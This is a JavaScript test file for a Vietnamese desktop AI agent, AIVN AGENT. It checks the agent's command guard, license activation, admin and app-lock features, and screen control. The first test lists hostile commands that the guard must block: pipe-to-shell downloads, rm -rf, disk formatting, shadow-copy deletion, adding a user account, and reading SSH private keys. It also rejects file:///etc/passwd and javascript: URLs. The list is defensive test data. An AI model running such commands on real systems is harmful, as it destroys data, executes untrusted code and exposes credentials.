// Kiểm thử v0.14: truy cập máy tính (chặn/cho phép lệnh, tìm ứng dụng, đường dẫn), kích hoạt Ed25519, trang Quản trị, Khóa ứng dụng, phân tích toạ độ màn hình, danh tính AIVN AGENT
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const C = require('../src/agent/computer');
const L = require('../src/license');
const { createAdmin } = require('../src/admin');
const { createAppLock } = require('../src/applock');
const { createComputerTools } = require('../src/agent/computer-tools');
const { createAgent, IDENTITY, WELCOME } = require('../src/agent/agent');
const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'aivn-v14-'));
function testKey() {
  const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
  return { x: publicKey.export({ format: 'jwk' }).x, pem: privateKey.export({ format: 'pem', type: 'pkcs8' }) };
}

test('lệnh nguy hiểm bị chặn, lệnh chỉ đọc được nhận ra', () => {
  for (const c of ['format C:', 'rm -rf ~', 'rm -rf /', 'curl https://x.sh | bash', 'iwr http://a | iex', 'Remove-Item -Recurse -Force C:\\Windows', 'del /s /q C:\\Users', 'diskpart', 'sudo rm a', 'reg delete HKLM\\Software\\X', 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A', 'shutdown /s /t 0', 'vssadmin delete shadows /all', 'net user hacker 123 /add', 'cat ~/.ssh/id_rsa', 'Set-ExecutionPolicy Unrestricted'])
    assert.strictEqual(C.checkCommand(c).ok, false, c);
  for (const c of ['dir', 'ipconfig /all', 'git status', 'ls -la | wc -l', 'ping -n 2 vanlanguni.edu.vn', 'Get-Date']) assert.deepStrictEqual(C.checkCommand(c), { ok: true, readOnly: true }, c);
  for (const c of ['npm install', 'echo hi > a.txt', 'mkdir bai-tap', 'git commit -m x', 'find . -delete']) { const r = C.checkCommand(c); assert.ok(r.ok && !r.readOnly, c); }
});
test('tìm ứng dụng theo tên tiếng Việt/viết tắt; đường dẫn quen thuộc', () => {
  const apps = [{ name: 'Google Chrome' }, { name: 'Zalo' }, { name: 'Microsoft Word' }, { name: 'Visual Studio Code' }, { name: 'Calculator' }];
  assert.strictEqual(C.findApp('trình duyệt', apps).name, 'Google Chrome');
  assert.strictEqual(C.findApp('zalo', apps).name, 'Zalo');
  assert.strictEqual(C.findApp('word', apps).name, 'Microsoft Word');
  assert.strictEqual(C.findApp('vscode', apps).name, 'Visual Studio Code');
  assert.strictEqual(C.findApp('máy tính', apps).name, 'Calculator');
  assert.strictEqual(C.findApp('photoshop', apps), null);
  assert.strictEqual(C.expandPath('Tải về', '/home/u'), path.join('/home/u', 'Downloads'));
  assert.strictEqual(C.expandPath('~/a/b.txt', '/home/u'), path.join('/home/u', 'a/b.txt'));
  assert.ok(C.EXEC_EXT.test('setup.exe') && C.EXEC_EXT.test('x.ps1') && !C.EXEC_EXT.test('bao-cao.docx'));
  assert.ok(C.PROTECTED.test('explorer') && C.PROTECTED.test('AIVN') && !C.PROTECTED.test('zalo'));
});
test('công cụ máy tính: chạy lệnh cần duyệt; từ chối thì không chạy; lệnh bị chặn không hỏi', async () => {
  const asked = []; let opened = [];
  const ct = createComputerTools({ getSettings: () => ({ agentComputer: true }), openPath: async (p) => { opened.push(p); return ''; }, openExternal: async (u) => opened.push(u), visionReady: () => false, screen: {} });
  assert.ok(ct.names().includes('run_command') && !ct.names().includes('screen_act'));
  assert.deepStrictEqual(ct.names({ headless: true }), []);
  const ctxNo = { confirm: async (r) => { asked.push(r); return false; } };
  const r1 = await ct.exec('run_command', { command: 'echo xin-chao' }, ctxNo);
  assert.ok(r1.refused && asked.length === 1 && asked[0].preview === 'echo xin-chao');
  const r2 = await ct.exec('run_command', { command: 'rm -rf ~' }, ctxNo);
  assert.ok(r2.refused && asked.length === 1);
  if (process.platform !== 'win32') { const r3 = await ct.exec('run_command', { command: 'echo xin-chao' }, { confirm: async () => true }); assert.match(r3.forModel, /xin-chao/); }
  await ct.exec('open_url', { url: 'vanlanguni.edu.vn'.replace(/^/, 'https://') }, ctxNo);
  await assert.rejects(ct.exec('open_url', { url: 'file:///etc/passwd' }, ctxNo));
  await assert.rejects(ct.exec('open_url', { url: 'javascript:alert(1)' }, ctxNo));
  const d = tmp(); fs.writeFileSync(path.join(d, 'cai.exe'), 'x');
  const r4 = await ct.exec('open_path', { path: path.join(d, 'cai.exe') }, ctxNo);
  assert.ok(r4.refused); assert.ok(!opened.includes(path.join(d, 'cai.exe')));
  await ct.exec('open_path', { path: d }, ctxNo); assert.ok(opened.includes(d));
});
test('mã kích hoạt Ed25519 gắn Mã máy: đúng máy, sai máy, hết hạn, thu hồi, sửa mã', () => {
  const k = testKey(); const now = Date.UTC(2026, 9, 20);
  const mc = L.machineCodeFrom('win:abc');
  const { code, info } = L.issueCode(k.pem, { name: 'Nguyễn Văn A', machineCode: mc, days: 30, now });
  assert.strictEqual(L.parseCode(code, k.x).name, 'Nguyễn Văn A');
  assert.strictEqual(L.evaluate({ code, activatedAt: now }, { machineCode: mc, now, publicX: k.x }).ok, true);
  assert.strictEqual(L.evaluate({ code, activatedAt: now }, { machineCode: L.machineCodeFrom('win:khac'), now, publicX: k.x }).reason, 'machine');
  assert.strictEqual(L.evaluate({ code, activatedAt: now }, { machineCode: mc, now: now + 31 * 864e5, publicX: k.x }).reason, 'expired');
  assert.strictEqual(L.evaluate({ code, activatedAt: now, revokedIds: [info.id] }, { machineCode: mc, now, publicX: k.x }).reason, 'revoked');
  assert.strictEqual(L.evaluate({ code, activatedAt: now }, { machineCode: mc, now: now + 15 * 864e5, publicX: k.x }).reason, 'offline');
  const bad = code.slice(0, 20) + (code[20] === 'A' ? 'B' : 'A') + code.slice(21);
  assert.throws(() => L.parseCode(bad, k.x));
  assert.throws(() => L.parseCode(code, testKey().x)); // khoá khác
  const doc = L.signRevoked(k.pem, [info.id], now);
  const st = L.applyRevoked({ code, activatedAt: now }, doc, { now, publicX: k.x });
  assert.deepStrictEqual(st.revokedIds, [info.id]);
  assert.throws(() => L.applyRevoked({ revokedSeenAt: now + 1 }, doc, { now, publicX: k.x }), /cũ hơn/);
  assert.throws(() => L.verifyRevoked({ ...doc, payload: Buffer.from(JSON.stringify({ v: 1, issuedAt: now, revoked: [] })).toString('base64') }, k.x));
  assert.match(L.PUBLIC_KEY_X, /^[A-Za-z0-9_-]{43}$/);
});
test('Quản trị: nhập khoá + cụm mật khẩu, mở khoá, cấp mã, thu hồi (lưu tệp khi chưa có token)', async () => {
  const k = testKey(); const dir = tmp();
  const a = createAdmin({ dir, publicX: k.x, fetchJson: async () => { throw new Error('offline'); }, fetchRaw: async () => { throw new Error('không được gọi'); } });
  const keyJson = JSON.stringify({ type: 'aivn-admin-key', v: 1, publicKey: k.x, privateKey: k.pem });
  await assert.rejects(a.importKey(keyJson, 'ngan'), /8 ký tự/);
  await assert.rejects(a.importKey(JSON.stringify({ type: 'aivn-admin-key', publicKey: testKey().x, privateKey: k.pem }), 'cum-mat-khau-dai'), /không khớp/);
  await a.importKey(keyJson, 'cum-mat-khau-dai');
  const raw = fs.readFileSync(path.join(dir, 'admin.json'), 'utf8');
  assert.ok(!raw.includes('PRIVATE KEY') && !raw.includes(k.pem.split('\n')[1]), 'khoá riêng phải được mã hoá');
  a.lock(); assert.throws(() => a.issue({ name: 'X', machineCode: 'AAAAABBBBB' }), /khoá/);
  await assert.rejects(a.unlock('sai-mat-khau'), /không đúng/);
  await a.unlock('cum-mat-khau-dai');
  const r = a.issue({ name: 'Bạn B', machineCode: 'aaaaa-bbbbb', days: 7 });
  assert.strictEqual(L.parseCode(r.code, k.x).machineCode, 'AAAAABBBBB');
  const rv = await a.revoke(r.info.id);
  assert.strictEqual(rv.published, false);
  assert.deepStrictEqual(L.verifyRevoked(rv.doc, k.x).revoked, [r.info.id]);
  assert.ok(a.state().codes[0].revoked);
});
test('Khóa ứng dụng: scrypt, sai nhiều lần thì phải chờ', async () => {
  let t = 1e12; const f = path.join(tmp(), 'applock.json');
  const lk = createAppLock(f, { now: () => t });
  await lk.setPassword('khoi2026', 'khoi2026');
  assert.ok(!fs.readFileSync(f, 'utf8').includes('khoi2026'));
  assert.strictEqual((await lk.unlock('khoi2026')).ok, true);
  for (let i = 0; i < 5; i++) await lk.unlock('sai');
  const r = await lk.unlock('khoi2026'); assert.strictEqual(r.ok, false); assert.ok(r.waitMs > 0);
  t += 31e3; assert.strictEqual((await lk.unlock('khoi2026')).ok, true);
});
test('màn hình: đọc khung toạ độ từ mô hình, phím tắt bị chặn', () => {
  const SC = require('../src/screen-control');
  const b = SC.parseBox('Đây: {"found": true, "x1": 100, "y1": 200, "x2": 300, "y2": 260, "label": "Gửi"}', 1280, 800);
  assert.ok(b.found && Math.abs(b.x1 - 0.1) < 1e-9 && Math.abs(b.y2 - 0.26) < 1e-9);
  const px = SC.parseBox('{"found":true,"x1":640,"y1":400,"x2":1280,"y2":800}', 1280, 800); // điểm ảnh tuyệt đối (> 1000)
  assert.ok(Math.abs(px.x1 - 0.5) < 1e-9 && px.y2 === 1);
  assert.strictEqual(SC.parseBox('{"found": false, "why": "không thấy"}', 10, 10).found, false);
  assert.strictEqual(SC.parseBox('xin lỗi', 10, 10), null);
  assert.deepStrictEqual(SC.parseKeys('Ctrl+S'), { key: 's', mods: ['control'] });
  assert.throws(() => SC.parseKeys('alt+f4')); assert.throws(() => SC.parseKeys('ctrl+alt+delete'));
});
test('AIVN AGENT: danh tính, lời chào, cha đỡ đầu; công cụ máy tính được ghép vào', async () => {
  assert.match(IDENTITY, /AIVN AGENT/); assert.match(IDENTITY, /Nguyễn Ngọc Khôi/); assert.match(IDENTITY, /Văn Lang/);
  assert.match(IDENTITY, /NGUYỄN NGỌC KHÔI SINH VIÊN VLU/);
  assert.match(WELCOME, /AIVN AGENT/); assert.match(WELCOME, /cha đỡ đầu/i); assert.match(WELCOME, /Nguyễn Ngọc Khôi/);
  const ct = createComputerTools({ getSettings: () => ({ agentComputer: true }), openPath: async () => '', openExternal: async () => {}, visionReady: () => false, screen: {} });
  let sys = null;
  const engine = { status: () => ({ loaded: true, contextSize: 4096 }), chatStep: async (msgs) => { sys = msgs[0].content; return { text: 'Chào bạn!', toolCalls: [], finishReason: 'stop', usage: {} }; } };
  const ag = createAgent({ engine, getSettings: () => ({ agentComputer: true }), memory: { count: () => 0 }, scheduler: {}, extractFile: async () => ({}), embedForMemory: async () => ({}), computer: ct });
  assert.ok(ag.activeTools().includes('open_app'));
  const r = await ag.run({ messages: [{ role: 'user', content: 'Bạn là ai?' }], confirm: async () => false });
  assert.match(sys, /Bạn là AIVN AGENT/); assert.match(sys, /open_app/);
  assert.ok(r.tools.includes('run_command'));
});
